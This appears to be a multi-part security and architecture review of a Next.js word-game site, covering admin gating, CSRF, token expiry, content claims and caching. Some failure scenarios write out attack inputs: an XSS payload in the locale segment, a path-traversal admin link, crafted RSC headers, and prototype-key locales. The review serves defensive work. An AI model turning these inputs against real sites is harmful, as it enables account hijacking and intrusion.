## 4. Parental controls don't let a parent manage a child's account, and the adult tier comes from a self-declared age on the same screen (Medium, store compliance)
**Where:** `fe-next/app/[locale]/account/parental-controls/PageClient.tsx:9-14, 76-89`

**Failure scenario A (parent):**
1. A parent opens this page on their child's device.
2. The account is child tier, so they see `pcAdultOnly` and no controls.
3. The page only lets an adult reduce their own features. Google Families policy asks for a way for adults to manage the social features of the children's experience, so this screen doesn't actually meet the requirement it was built for.

**Failure scenario B (child):**
1. A child whose age is unknown opens the page.
2. They tap "Add age" (line 80) and enter 1980.
3. `birth_year` is stored, the tier becomes adult, and chat, friend messaging and custom display names unlock.
4. The comment "a child cannot self-elevate" (line 11) only holds once `birth_year` exists, and only if it can never be rewritten.

**Fix:**
- Make `birth_year` write-once on the server, with a DB trigger or a column-level RLS policy. Log any attempted change.
- Add a parent-managed mode, such as a parent PIN or a parent-email confirmation, that can switch off a child account's surfaces.
- Until those exist, don't present this page to store reviewers as the Families-policy control.

## 5. The delete page's magic-link form is an unauthenticated email sender that can also create accounts (Medium)
**Where:** `fe-next/app/[locale]/account/delete/PageClient.tsx:29-46`

**Failure scenario:**
1. The page is public. A script submits thousands of addresses it doesn't own.
2. Each one calls `signInWithMagicLink(email)`. If that wraps `signInWithOtp` with the default `shouldCreateUser: true`, every unknown address becomes a new auth user, and a sign-in email is sent from your sender.
3. The result:
   - orphan users inflate funnel and admin metrics;
   - Supabase or SMTP rate limits are used up, so real teachers' magic links stall;
   - complaint rates hurt the sending domain that also carries trial and conversion emails.
4. The link also has no visible `emailRedirectTo` pointing back to `/{locale}/account/delete`, so a legitimate user may land somewhere unrelated after clicking it.

**Fix:**
- Pass `shouldCreateUser: false` and `emailRedirectTo: ${origin}/${locale}/account/delete` for this flow.
- Turn on Supabase's captcha (Turnstile or hCaptcha) for OTP.

## 6. JSON-LD is serialised without escaping `</`, and the code comments wrongly say no user input is included (Medium if unknown locales reach the page, otherwise Low)
**Where:** `fe-next/app/[locale]/about/page.tsx:85-132` and `about/ohad-fisher/page.tsx:88-128`. The comments at `ohad-fisher:121` and `about:129` say "no user input".

**Failure scenario:**
1. Both schemas interpolate `locale`, which is the raw URL segment, into the URLs inside them.
2. `JSON.stringify` does not escape `<` or `/`.
3. Suppose two things are true: middleware forwards an unknown first segment, and Next decodes `%2F` inside a param. Then a URL whose locale segment decodes to `</script><script>…` closes the `<script type="application/ld+json">` early and runs script on `lexiclash.live`. That is reflected XSS against signed-in teachers.
4. The previous pass mentioned this only as an aside. These two files are concrete instances, and they share one fix.

**Fix:**
- Add a single `safeJsonLd(obj)` helper that returns `JSON.stringify(obj).replace(/</g, '\\u003c')` and use it everywhere `dangerouslySetInnerHTML` is used for JSON-LD.
- Validate `locale` once in `[locale]/layout.tsx` and call `notFound()` for unknown values.

## 7. Invite links crash the homepage when browser storage is blocked (Low-Medium; affects the viral loop)
**Where:** `fe-next/app/[locale]/PageClient.tsx:79`, inside a `useState` initializer that runs during render.

**Failure scenario:**
1. An invited friend opens `/en?room=ABC` in a browser where storage access throws. Examples are iOS Safari with "Block All Cookies", some in-app browsers, and storage-restricted iframes. The app already detects CrazyGames embeds, so iframe contexts are expected.
2. `sessionStorage.setItem` throws a `SecurityError` during render.
3. The error boundary renders an error instead of the landing page. The invite, which is the cheapest way you acquire users, dead-ends.

**Fix:**
- Wrap line 79, and the storage calls in `savePendingRoomInvite` if they aren't already guarded, in `try/catch`.
- Move the analytics and storage side effects into an effect, keeping only the pure parse in the initializer.

## 8. Stale-deploy recovery on the 404 page can reload in a loop once you run several instances (Low; appears at 10x)
**Where:** `fe-next/app/[locale]/NotFoundClient.tsx:31-56`

**Failure scenario:**
1. You scale to two or more app instances that were built separately, or you are partway through a rolling deploy. `NEXT_PUBLIC_BUILD_TIME` is baked in per build.
2. A genuine 404 page loads from instance A. `/api/version` is load-balanced to instance B, the build times differ, and `clearCachesAndReload` runs.
3. The only loop guard is `sessionStorage`. When storage is unavailable, as in #7, the page reloads every time the two instances disagree.
4. Each reload also clears caches, which can force large assets such as the prewarmed dictionaries to download again.

**Fix:**
- Deploy one build artifact to all replicas and compare a commit SHA rather than a timestamp.
- Add a URL-based fallback guard (for example `?_r=1`) for when `sessionStorage` throws, so the page reloads at most once.

---

**Checked and not flagged:**
- `LazyMotionRoot` and `HomeClient`.
- The `?host=` sanitiser.
- The invite redirect, which is built with `URLSearchParams` and stays same-origin.
- The delete call itself: a cross-site page can't send `DELETE` without a CORS preflight. This only holds if `/api/account/delete` rejects GET and POST, so confirm that.
- The test mocks and the contrast and GIF dev scripts. These have no runtime exposure.

**Priority:** if you are about to take money, do #2 and #1 first. #3 matters before any traffic push.

## Shard 29

# Review: admin, adventure and anagram slice — gaps the previous pass missed

This slice is mostly admin client pages. The previous pass already covered the obvious items here, so I don't repeat them:

- the web-vitals filter, refetch and NaN bugs
- the anagram force-dynamic full-dictionary scan
- the anagram 300-result truncation
- the curators GET request sent without a bearer token
- the "70 vs 100 levels" copy mismatch
- the "confirm RLS on `web_vitals`" note

What follows is new. Two items depend on code I couldn't see (API routes, RPCs, Next's param decoding), and I mark where.

---

## 1. The admin server gate isn't a data boundary, but its comment says it is

**Where:** `fe-next/app/[locale]/admin/layout.tsx:10-23`
**Severity:** Medium today. It becomes High the first time someone adds a data-reading server component under `/admin`.

**The problem.** The comment says the layout "stops the RSC payload and data reads from being served to non-admins." That isn't true in the Next App Router.

**How it fails:**
1. Layouts use partial rendering. On client navigation between `/admin/*` routes, the server re-renders only the segments that changed. `AdminLayout` and its `isAdminSession()` call don't run again. Next's auth docs warn about exactly this.
2. Someone can also send a crafted RSC request (`RSC: 1` plus a `Next-Router-State-Tree` header saying the client already has the `[locale]/admin` layout). The server then renders only the leaf `page.tsx`, and the layout check never runs.
3. Today the leaves are thin client wrappers. `players/[id]/page.tsx:7-9` is the one async server page, and it reads only `params`. Nothing sensitive leaks yet. The client JS chunks are public static assets anyway.
4. The comment tells you that admin pages are protected. The next time you write `createAdminClient().from('teacher_subscriptions')…` inside an admin `page.tsx`, trusting the layout, that data can be served to anyone.

**The real boundary.** Every route under `app/api/admin/*` must enforce admin access itself. Today that is inconsistent:
- The curators page calls `GET /api/admin/curators` with no Authorization header (`curators/PageClient.tsx:33`).
- It sends the bearer token on POST only when one exists (`:57`).
- That means some admin routes accept cookie sessions and others require bearer tokens.
- Each route runs its own guard, so one route that forgets the guard leaves everything it serves open.

**Fix:**
- Add a `requireAdmin()` helper and call it at the top of every admin `page.tsx` and every server data function. Keep the layout check for UX only, and correct the comment.
- Wrap every `app/api/admin/**/route.ts` handler in a single `withAdmin(handler)` wrapper that accepts one auth transport.
- Add a test that globs those route files and fails if a handler isn't wrapped. This takes about 20 lines and closes the whole class of "did this route check admin?" bugs.

## 2. Five admin pages fetch the bearer token once, and it expires mid-session

**Where:**
- `admin/dictionary/PageClient.tsx:39-43`
- `admin/guests/PageClient.tsx:38-42`
- `admin/guests/[sessionId]/PageClient.tsx:134-138`
- `admin/invalid-words/PageClient.tsx:39-43`
- `admin/milog-words/PageClient.tsx:39-43`
- `admin/players/PageClient.tsx:39-43`

**Severity:** Medium. These are the dictionary and moderation workflows, which are your data-quality pipeline.

**How it fails:**
1. You open, say, Invalid Words. `getSession()` runs once, and the access token string is stored in state.
2. supabase-js refreshes the session in the background, but this copy is never updated. The effect only re-runs if `authLoading` or `isAdmin` changes.
3. About an hour later (the default JWT lifetime), every request from `InvalidWordsManager`, `CommunityWordsManager` or `PlayerManager` carries an expired token and gets a 401.
4. If a manager runs a multi-request bulk action, the first part applies and the rest fails. You end up with a half-applied batch and an error that doesn't say "re-login".

Other pages already handle this: `LiveMonitor` uses `useAdminAuth` with `onTokenExpired={refreshToken}` (`admin/PageClient.tsx:155`). The pattern exists but isn't applied everywhere.

**Fix:** pass a `getToken: () => Promise<string>` function that calls `getSession()` on each request, instead of a static string. You could also use `useAdminAuth` on every page. Either way, retry once after a refresh when a request returns 401.

## 3. Failed admin fetches show "empty" instead of "error"

**Where:**
- `admin/moderation/PageClient.tsx:38-51`
- `admin/analytics/PageClient.tsx:62-80`

**Severity:** Low–Medium. You make decisions from these screens.

**How it fails:**
1. The moderation queue fetch never checks `res.ok`. A 401 or 500 returns `{ error }`, which becomes `items = []` and `total = 0`.
2. The sidebar and bottom-nav badge (`:127`, `:139`) then show 0. The queue looks clear while submissions pile up.
3. Analytics behaves the same way. Each `.then(r => r.json())` resolves on any HTTP status, so a failed `churn-risk` call renders "0 players at risk". A failed funnel call renders a blank funnel.
4. Combined with #2, an expired session doesn't look broken. It looks like "nothing to do."

**Fix:** check `res.ok`, keep a per-panel `error` state, and render an error banner with a retry button rather than empty data.

## 4. Web vitals will collapse at 10x traffic, and the failure is silent

**Where:** `admin/web-vitals/PageClient.tsx:146-151` and `:177-186`. This is inferred: I can't see the RPC or the schema.

**Severity:** Medium at the next 10x.

**How it fails:**
1. Every page view writes up to six `web_vitals` rows. I see no retention policy anywhere.
2. Each time the page loads or you click Refresh, `get_web_vitals_stats` computes average, p75 and p95 over up to 30 days. Percentiles need a sort over the full window.
3. At 10x traffic the table holds tens of millions of rows a month. The RPC hits the statement timeout.
4. The error is only written to `console.error` (`:181-184`), and `stats` stays `[]`. The cards disappear with no message.
5. The table query is capped at `.limit(1000)`, so the "Recent Measurements (1000)" figure won't tell you anything is wrong.

**Fix:**
- Add a nightly rollup into a `web_vitals_daily(metric, device, day, p75, p95, counts)` table.
- Delete raw rows older than about 14 days with pg_cron.
- Add an index on `(metric_name, created_at)`.
- Show a visible error state when the RPC fails.

## 5. The guest detail page builds an authenticated request path from the URL

**Where:** `admin/guests/[sessionId]/PageClient.tsx:115` and `:146`
**Severity:** Low. It depends on how Next decodes `%2F` in `useParams`, so verify that first.

**How it fails:**
1. An attacker sends you a link such as `/en/admin/guests/..%2F..%2Fadmin%2F<some-get-route>`.
2. The server gate passes, because you are an admin.
3. If `useParams()` returns the decoded value, `sessionId` becomes `../../admin/<route>`.
4. `fetch(`/api/admin/guests/${sessionId}`)` normalises to `/api/admin/<route>` and sends it with your Bearer token.
5. The token stays on your own origin, so it doesn't leak. But any admin GET route with a side effect would run on your behalf. Examples are an export or an "approve/apply" action exposed as GET.

The sibling page `players/[id]` already uses `encodeURIComponent(playerId)` (`players/[id]/PageClient.tsx:41`).

**Fix:** use `encodeURIComponent(sessionId)`, and reject anything that doesn't match your session-id format before you fetch. Separately, make sure no admin GET handler mutates state.

## 6. The curator revoke route seems to accept cookie-only auth for a state change

**Where:** `admin/curators/PageClient.tsx:53-59`
**Severity:** Low. It depends on how the route is written.

**Why I think so:** the client sends `Authorization` only if a session exists, and the list GET sends none at all. That suggests `/api/admin/curators` authenticates through cookies.

**How it fails:**
1. A cookie-authenticated POST is a CSRF surface if the handler parses the body with `req.json()` whatever the `Content-Type`. A `text/plain` form post is a "simple" request and gets no CORS preflight.
2. Supabase SSR cookies default to `SameSite=Lax`. That blocks cross-site POSTs, so this is mostly contained.
3. Lax does not block same-site origins, such as any `*.lexiclash.live` subdomain or preview host that someone can get content onto.

**Fix:** for any non-GET admin route, require the bearer header, or check `Origin` against your host. Folding this into #1's `withAdmin` wrapper gives you that check in one place.

## 7. Mobile pull-to-refresh on the admin dashboard does nothing

**Where:** `admin/PageClient.tsx:179-181`
**Severity:** Low.

**How it fails:** `onRefresh` only waits 500 ms. On your phone you pull down, see the spinner, and then read the same KPIs, health and live-monitor data as before, believing it is fresh.

**Fix:** have `useAdminDashboard` expose a `refetch` and await it. If you'd rather not wire that up, remove the wrapper.

---

**If you only do one thing:** do #1. The `withAdmin` wrapper plus the route-enumeration test turns "is every admin route protected?" from a per-file review question into a CI failure. It also fixes the mixed cookie and bearer auth that caused the curators bug the previous pass found.

## Shard 30

# Security and architecture review: findings the previous pass missed

This batch is mostly static SEO pages plus the Blast V2 client. The earlier pass already covered most of it, so I've left out everything it reported: the `&apos;` entities, the ad and language claims, the `ru` 404 on Blast, the boot-loader cancellation race, date and locale formatting, and hardcoded pricing.

There are **7 new findings**. Most depend on code outside this batch, such as `useBlastProgress`, the `/api/blast/*` routes and `anagram/[letters]`. I say what to check for each one.

---

## 1. `/blast/v2` is described as admin-only, but nothing gates it, and its rewards rest on client claims
**Severity:** Medium. High if Blast coins can be spent on anything.

**Where:**
- `blast/page.tsx:19-21` says V2 "lives at its own admin-only route (`/blast/v2`)".
- `blast/v2/page.tsx:18-22` says "Public… renders for everyone".
- `blast/v2/page.tsx:46-47` calls it "a dedicated V2 dev route… an admin should see".
- Neither `page.tsx` nor `BlastV2PageClient.tsx` checks admin status.

**How it fails:**
1. Anyone opens `/en/blast/v2`. `useBlastProgress` runs, and `BlastGame` calls `clear-level` and `open-chest`. The earlier pass established that these award coins and chest progress.
2. V2 deliberately builds boards on the client when offline (`BlastV2PageClient.tsx:25-38`, `resolveOfflineLevel`). The server therefore cannot know whether a board was solved. `clear-level` has to accept "I cleared N" on the client's word.
3. A script loops the `clear-level` POST and farms coins.
4. "Play Again" (`:142-146`) resets to level 1 and re-clears every level. If `clear-level` pays per call rather than once per first clear, normal play becomes an infinite faucet.
5. The avatar builder spends gold on premium parts (`avatar-test/fixtures.ts:40-43`, `purchaseWithGold`). If that is the same balance, this is an economy hole.

**Fix:** Decide which comment is true.
- **If admin-only:** add a server-side `is_admin` check that calls `notFound()` in `v2/page.tsx`, and add the same check to the `/api/blast/*` V2 routes.
- **If public:**
  - Make `clear-level` pay only when `level == stored current_level`, as an atomic `UPDATE … WHERE current_level = $level RETURNING`.
  - Rate-limit the route.
  - Keep V2 rewards out of any balance that can be spent.
- Either way, delete the stale comment.

## 2. Boot gate has no timeout, so the advertised offline launch can hang forever
**Severity:** Medium. It breaks the main reason V2 exists.

**Where:** `BlastV2PageClient.tsx:56-58`, `:76-77`, `:148-166`

**How it fails:**
1. A signed-in player reaches level 12, so the resume hint is set to 12.
2. They launch offline, which is the "rider with no connection" case in `v2/page.tsx:18-22`.
3. Because the hint (12) is greater than 1, `booting` starts as `true`.
4. The progress GET fails. If `useBlastProgress` only sets `progressLoaded` on success, the effect returns at line 77 every time.
5. The loader stays up forever, with no retry or escape. A slow or 5xx GET while online does the same.

This is separate from the cancellation race the earlier pass found in the same effect.

**Fix:**
- Add a 3-second timeout, plus an immediate path when `navigator.onLine === false`.
- In both cases, call `setBooting(false)` and load `resolveOfflineLevel(readResumeHint())`.
- Put `setBooting(false)` in a `finally`, which also fixes the earlier race.
- Check how `useBlastProgress` handles a failed GET.

## 3. Saved progress is overwritten with a lower level on Restart or replay
**Severity:** Low–Medium (data integrity).

**Where:** `BlastV2PageClient.tsx:100`, `:104-106`, `:124-129`, `:142-146`

**How it fails:**
1. A guest at level 30 taps Restart, or "Play Again" after finishing.
2. They clear level 1.
3. `writeGuestProgress({ currentLevel: 2 })` and `writeResumeHint(2)` run without comparing against the saved level.
4. Their saved level of 30 becomes 2. The guest-claim-on-signup path then sends 2.
5. The effect comment (`:75`) calls this a "high-water-mark", but the code doesn't enforce one.
6. For signed-in players, the same regression happens on the server if `clear-level` writes `current_level = level+1` instead of `GREATEST(...)`.

**Fix:**
- On the client, write `Math.max(existing, next)` for both the guest progress and the resume hint.
- On the server, use `GREATEST(current_level, $next)`.

## 4. Anagram hub tells users and search engines the solver works in a way it doesn't
**Severity:** Medium. These are privacy claims on a site going through AdSense review.

**Where:**
- `anagram/page.tsx:35`: "runs entirely in your browser with zero data sent to third parties".
- `:41`: "runs locally in your browser".
- Russian versions at `:188` and `:194`.
- "ad-free for the solver itself" at `:51`, `:95`, `:173` and `:204`.
- Published as FAQPage JSON-LD (`:315`) and in `GamePageSeoContent` (`:424`).

**How it fails:**
1. The earlier pass found that `anagram/[letters]/page.tsx` is `force-dynamic` and scans the dictionary on the server. The letters are sent to your server, not solved locally.
2. If that page loads analytics or ad scripts, "zero data sent to third parties" is also false. Check whether it renders `InlineBannerAd`.
3. Swedish has a related problem. The only indexed non-English page (`:249-268`) targets the query "anagram svenska" and promises Swedish words (`:16`, "giltigt tävlingsord"). The Swedish description on the same page (`:102`, `:114`) says it returns "lagligt engelskt ord", meaning English words.
4. If `[letters]` uses the English dictionary for `sv`, every Swedish searcher lands on English results.

**Fix:**
- Rewrite the claims to say "solved instantly on our server; no account".
- Drop "ad-free" unless the `[letters]` page really has no ads.
- Either use a Swedish dictionary for `/sv/anagram/*`, or stop indexing `sv` and remove the "svenska" promise.

## 5. Pages that should be cached are rendered on every request
**Severity:** Low now. Medium at 10x traffic or under heavy crawling.

**Where:**
- `anagram/page.tsx:225` and `:229`: `force-dynamic` overrides `revalidate = 86400`. The page is entirely static content, yet it is rendered on every hit.
- `blast/v2/page.tsx:11` and `:35-38`: `buildRegistry()` and a full board resolve run on every request.

**How it fails:**
1. Crawler and SEO traffic grows.
2. Each hit costs a server render on the same Node process. The earlier pass noted that this process also serves the game sockets.
3. `/api/blast/level` likely regenerates boards on every advance as well (not visible here).

**Fix:**
- Delete `force-dynamic` from the anagram hub.
- For V2:
  - Build the registry once at module scope.
  - Cache resolved levels with `unstable_cache` keyed on `(level, locale, variant)`, or revalidate until the next UTC midnight.
  - Use the same cache in `/api/blast/level`.

## 6. Factual accusations against named competitors, published as structured data
**Severity:** Low–Medium (legal and trust risk).

**Where:** `best-online-word-games/page.tsx`
- `:198`: "Expect ads every 30 seconds".
- `:200`: "Lots of bot opponents disguised as players".
- `:60`: FAQ JSON-LD, "sometimes every 30 seconds".
- `:141`: ItemList, "ad-heavy".
- Unqualified "only" claims at `:56`, `:64`, `:80` and `:546`.

**How it fails:** These are statements of fact about Scopely's and Zynga's products. They sit in machine-readable markup that answer engines quote verbatim. The bot accusation is the riskiest.

**Fix:**
- Phrase them as your own experience, for example "in our testing, ads appeared between most games".
- Delete the bot claim.
- Qualify the "only" claims.

## 7. Unescaped locale in JSON-LD: new instances of an earlier flag
**Severity:** Conditional. Effectively zero if the locale is whitelisted upstream. High (XSS on the session origin) if it isn't.

**Where:**
- `balda-onlayn/page.tsx:72-73`, rendered at `:79-80`.
- `bell-ringer-word-games/page.tsx:76-78`, rendered at `:90-91`.

**How it fails:** `locale` comes from route params and goes into `JSON.stringify(...)` inside `<script dangerouslySetInnerHTML>`. `JSON.stringify` does not escape `</script>`. The earlier pass raised this as "confirm the whitelist" on other pages. Patching it page by page won't hold, because every new SEO page copies the pattern.

**Fix:** Fix it once, centrally:
- Add a shared `toJsonLd(obj)` helper that returns `JSON.stringify(obj).replace(/</g, '\\u003c')`.
- Call `notFound()` for unknown locales in `app/[locale]/layout.tsx`.

---

## Checked, no new issues
- **`avatar-test/*`:** gated by `notFoundInProduction()` (`page.tsx:15`). Make sure that helper uses a check that preview deploys can't bypass.
- **`blast/error.tsx`:** the `window.location.href = /${locale}` redirect is only reachable when the locale is already valid.
- **`blast/legacy/PageClient.tsx`:** no new issues.
- **`blog/10-surprising-benefits-word-games/PageClient.tsx`:** only repeats patterns the earlier pass already reported.

## Shard 31

# Senior review: blog content slice (what the previous pass missed)

## Scope

The files in this batch are six blog articles (`10-surprising-benefits`, `ai-vs-word-games`, `alternativas-a-scrabble`, `best-boggle-alternatives-2026`) and the blog index. They contain:

- no auth
- no writes
- no user input
- no secrets
- no concurrency

So there are **no authz, injection, secrets or race findings to report in these files.**

What they do carry is legal and trust exposure, plus one architecture problem that grows with the content library. I've left out everything the previous pass already reported:

- fabricated Reddit and Utrecht claims
- the four-languages contradiction
- the "no ads" tone
- the Hebrew QAT joke
- the `language`-vs-`locale` date bug
- Japanese `wordCount`
- the Spanish "Dieciséis" count

**Revenue priority:** this batch is not where your highest risk sits. These items from the previous report still outrank everything below:

- **Shard 5 #1 and #2:** a spoofed `authUserId` lets a student act as the teacher, and `createClassroomGame` overwrites any existing game code.
- **Shard 4 #3:** a late Polar revoke can downgrade a re-subscribed teacher.

---

## 1. Your own product is labelled with Hasbro's "Boggle" trademark

**Severity:** Medium-high (business and legal).

**Where:**
- `best-boggle-alternatives-2026/content.ts:179` (`playBoggle: 'Play Boggle Free'`)
- `:335` (he)
- `:490` (sv)
- `:651` (ja, `ボグルを無料でプレイ`)
- The button at `best-boggle-alternatives-2026/PageClient.tsx:335-339` links to `/${locale}/play-boggle-online-free`.

**Failure scenario:**
1. A visitor clicks "Play Boggle Free" and lands on your game, not Hasbro's.
2. Using a competitor's mark to *describe* them is usually fine. Using it as the label for *your* product is the textbook trademark problem.
3. The repo already knows this. `alternativas-a-scrabble/content.ts:2` says "TM-safe framing ("el juego clásico de letras" not "Scrabble de Hasbro")". This page doesn't follow that rule.
4. A cease-and-desist, or a trademark complaint to AdSense or the app stores, lands in exactly the window when you're trying to get first revenue approved.

**Fix:**
- Relabel to "Play the classic word-grid game free", or similar, in all four locales.
- Audit the `/play-boggle-online-free` route name and the H1/metadata on that page against the same rule. I couldn't see that page.

## 2. The comparison table makes false claims about named competitors

**Severity:** Medium (comparative-advertising and credibility risk).

**Where:** `best-boggle-alternatives-2026/PageClient.tsx:58-65` and `:276`.

**Failure scenario:**
1. The "Free" column renders ❌ for Words With Friends 2, Wordscapes and Boggle With Friends (`free: false`).
2. All three are free to download, and your own article says so:
   - `content.ts:85` says Wordscapes shows ads "unless you pay for premium".
   - `content.ts:68-70` describes WWF as free with paid power-ups.
3. The page therefore makes a false factual statement about Zynga and PeopleFun products, in a table that sits next to their trademarks.
4. `content.ts:98` also presents invented "App Store reviews" in quotation marks ("Great game ruined by pay-to-win.").
5. A competitor or a reviewer can point to a factual falsehood. Comparative ads with false facts are the actionable kind.

**Fix:**
- Rename the column to something you can defend, such as "No ads / no IAP". Then fill it in accurately.
- Either remove the quoted review text or link to real reviews.

## 3. "10 Benefits" title and health claims are not what the page delivers

**Severity:** Medium (SEO quality, and the same FTC-style risk shard 34 found on a different article).

**Where:**
- `10-surprising-benefits-word-games/page.tsx:18-22`
- `:27` ("10 science-backed benefits… boost brain health")
- `content.ts:22` (the H1)
- `content.ts:28-126` (the body)

**Failure scenario:**
1. Google shows "10 Benefits of Playing Word Games Daily – Science-Backed Results".
2. The reader lands on a nine-section personal essay with no list of ten.
3. The essay explicitly disclaims causation (`content.ts:50-52`, "We can't say…"), which contradicts the "boost brain health" promise in the meta description. That description is also the JSON-LD description (`page.tsx:57`).
4. A mismatched snippet raises bounce rate, and Google can rewrite or demote misleading titles.

**Related problems on the same page:**
- **Misquote of a named scientist.** `content.ts:68` attributes to Dr. Devanand "indications of brain shrinkage on MRI", which reads as crosswords *causing* shrinkage. The trial reported *less* shrinkage, and the Hebrew copy at `:179` correctly says "מופחתת" (reduced). The English inverts a finding and attributes the inverted version to a real, named person.
- **Russian metadata.** The `ru` meta title (`page.tsx:23`) is the essay headline, not the "10 benefits" title. The `ru` description (`:32`) opens ungrammatically: "Есть ли пользу" should be "польза".

**Fix:**
- Retitle and re-describe the page as the essay it is in all six locales. One option is "I played word games daily for a year: what the science says". The other option is to restructure the body into ten items.
- Fix `content.ts:68` to say "reduced brain shrinkage", and remove the quotation marks unless you have the verbatim quote.

## 4. JSON-LD citations misdate and mislabel the sources they name

**Severity:** Low-medium (E-E-A-T and credibility). This is separate from the invented sources the previous pass flagged.

**Where:**
- `ai-vs-word-games-language-learning/page.tsx:78`
- `content.ts:54` (and the he/sv/ja/es copies at `:136`, `:208`, `:278`, `:350`)

**Failure scenario:**
1. The citation is titled "Vesselinov & Grego (2020)", but its own URL is `…/vesselinov-grego.duolingo12.pdf`. That study is from 2012, and it was commissioned by Duolingo.
2. The body says "Their own 2020 efficacy study (Vesselinov & Grego, published externally)", which gets the year wrong and calls Duolingo-funded work independent.
3. The citation at `page.tsx:73` labels Hung et al. (2018) a "Meta-Analysis". As I recall, that Computers & Education paper is a scoping review. Please verify this.
4. Anyone who checks the citations finds errors in the structured data you're asking Google to trust.

**Fix:**
- Change the year to 2012 and describe the study as "Duolingo-commissioned".
- Verify the Hung et al. paper type and drop "Meta-Analysis" if it is wrong. This compounds with the d = 0.67 effect-size issue the previous pass raised.

## 5. Every locale's full article text ships in the client JS bundle (breaks at 10x)

**Severity:** Medium (performance, SEO and ad viewability; grows linearly with posts × locales).

**Where:**
- `ai-vs-word-games-language-learning/PageClient.tsx:1, 13, 22`
- `alternativas-a-scrabble/PageClient.tsx:1, 15, 25`
- `best-boggle-alternatives-2026/PageClient.tsx:1, 15-16, 26-27`
- `10-surprising-benefits-word-games/page.tsx:63` uses the same pattern.

**Failure scenario:**
1. Each `PageClient` is `'use client'` and imports the whole `contentByLocale` object. For `10-surprising-benefits` that is about 680 lines of prose in six languages.
2. It picks the locale at runtime (`contentByLocale[locale]`), so the bundler cannot tree-shake the other five.
3. Every visitor downloads and parses all locales' text in JS, on top of the server-rendered HTML that already contains their own locale.
4. With 26+ posts today and more locales planned, this is the route-level payload your Core Web Vitals and AdSense viewability depend on.
5. The server page already resolves the content (`page.tsx:44-45`) and then throws it away.

**Fix:**
- Pass the already-resolved `content` (and `faqs`) from `page.tsx` into `PageClient` as props.
- Better: make the article body a server component, and keep only the theme-dependent wrapper and the ads as client islands.

**Structural cause of the `ru` gaps:** the same refactor should type the per-locale maps as `Record<Locale, …>` instead of `Record<string, …>`. Examples are `blog/PageClient.tsx:21`, `ai-vs…/PageClient.tsx:24`, and `best-boggle…/PageClient.tsx:32, 48, 67`. A missing `ru` then becomes a type error instead of a silent English fallback. This is the root cause of the `ru` gaps the previous pass found one at a time.

## 6. Spanish visitors get a mixed-language Boggle-alternatives page

**Severity:** Low-medium (SEO and trust).

**Where:** `best-boggle-alternatives-2026/content.ts:22-653` against `PageClient.tsx:37, 45, 53, 72, 80`.

**Failure scenario:**
1. `contentByLocale` has `en`, `he`, `sv` and `ja` only. There is no `es`.
2. `PageClient` does define `es` for the TOC label, table headers, CTA and related-articles heading.
3. A visitor to `/es/blog/best-boggle-alternatives-2026` therefore sees Spanish chrome around an English article.
4. Whether this page is indexed depends on `hasTranslation` in this post's `page.tsx`, which I couldn't see. If it uses the `locale in metaTitles` pattern and `metaTitles` has `es`, the page is advertised as translated.

**Fix:** Write the `es` content, or confirm `hasTranslation` is false for `es` and drop the `es` chrome strings so the page reads consistently.

## 7. The Spanish Scrabble-alternatives article has factual errors and a claim that may indict your own product

**Severity:** Low-medium. The accent claim is unverified.

**Where:** `alternativas-a-scrabble/content.ts:69, 87, 89, 101`.

**Failure scenario:**
1. Lines 69 and 101 state a test for honest apps: if "AVION" without the accent counts the same as "AVIÓN", the app "no entendió tu idioma".
2. Your Spanish dictionary pipeline normalizes words. The previous report mentions `normEs` in `dictionary-improvement-es-targeted.js`, and Hebrew finals are normalized in `wikipediaWordProcessor.ts`.
3. If LexiClash's Spanish matcher strips accents, which normalizers commonly do, the article publicly fails your own product by your own stated standard.
4. Two factual errors make the page look careless to native readers:
   - Line 87 says "una 'araña' puede ser un insecto o un tipo de tijera para podar". Spiders are not insects, and the second meaning of "araña" is a chandelier, not pruning shears.
   - Line 89's grouping example (ESCALERA, AVENIDA, CALLEJÓN, PARQUE as "sitios donde puedes caminar") is not a credible Connections set.

**Fix:**
- Check whether Spanish word validation is accent-sensitive. If it isn't, delete the accent test from lines 69 and 101.
- Replace the "araña" and grouping examples with real ones.

## 8. Hebrew mistranslation that changes meaning

**Severity:** Low.

**Where:** `ai-vs-word-games-language-learning/content.ts:128`.

**What's wrong:**
- "ידעתי לנקד כל פועל" means "I could add vowel points to every verb". The English source (`:42`) says "conjugate", which in Hebrew is "להטות".
- `:144` turns the English "genitive plural in Russian" (`:64`) into "הזמן היחסי ביפנית" (relative tense in Japanese).
- Hebrew is your core market, and this is the quoted punchline of the article.

**Fix:** Change `:128` to "להטות כל פועל". Have a native speaker review the rest of the `he` block.

---

**Checked and not flagged:** the blog index (`blog/PageClient.tsx`) renders only static data, and its per-post `if (!postContent) return null` guard is correct. The `alternativas` `hasTranslation: locale === 'es'` gating is consistent with its Spanish-only content. The three ad slots in `ai-vs…/PageClient.tsx:102, 129, 163` are within normal density for the article length.

## Shard 32

# Review: blog batch (best-boggle-alternatives, boggle-vs-*, daily-challenge-strategies)

**Bottom line:** I found no authz, secrets, billing, or concurrency issues in these files. I found four real issues the previous pass missed. Two are architectural and recur across every blog page: the route param is used as an object key, and every locale's article text is bundled into the client. The previous pass already covered the copy problems here (the hardcoded `/en/` CTA, the duplicated paragraph, the missing Spanish accents, the date being formatted with `language` instead of `locale`), so I don't repeat them.

The highest-severity open items in the repo are still in earlier shards, not here. The client-spoofable `authUserId` socket auth (Shard 5 #1) and the overwritable classroom game codes (Shard 5 #2) should come before anything below.

---

## 1. Untrusted `locale` is looked up on plain objects, so prototype keys crash the page or pass the "translated" check
**Severity:** Medium if your middleware doesn't whitelist locales. None if it does. I couldn't see the middleware.

**Where:**
- `best-boggle-alternatives-2026/page.tsx:36-39, 44-50`
- `boggle-vs-scrabble/page.tsx:40-43, 48-51`
- `boggle-vs-wordle/page.tsx:36-39, 44-47`
- `boggle-vs-words-with-friends/page.tsx:36-47`
- `daily-challenge-strategies/page.tsx:37-45`
- The same lookup in each `PageClient.tsx:25`

**Failure scenario:**
1. A request arrives for `/constructor/blog/best-boggle-alternatives-2026`, from a crawler, a fuzzer, or someone poking at the site.
2. `contentByLocale['constructor']` returns the built-in `Object` function. That is truthy, so the `|| contentByLocale.en` fallback never runs.
3. `content.sections` is `undefined`, so `content.sections.reduce(...)` at `page.tsx:47` throws a TypeError and the server returns a 500.
4. In the scrabble, wordle and WWF pages, `extractFaqFromSections(undefined)` at `:51` / `:47` takes the same path.
5. In `generateMetadata`, `'toString' in metaTitles` is `true`, because `in` walks the prototype chain. `hasTranslation` is therefore `true`, and `title` becomes a native function.
6. The same keys work for `__proto__`, `hasOwnProperty`, and `valueOf`.

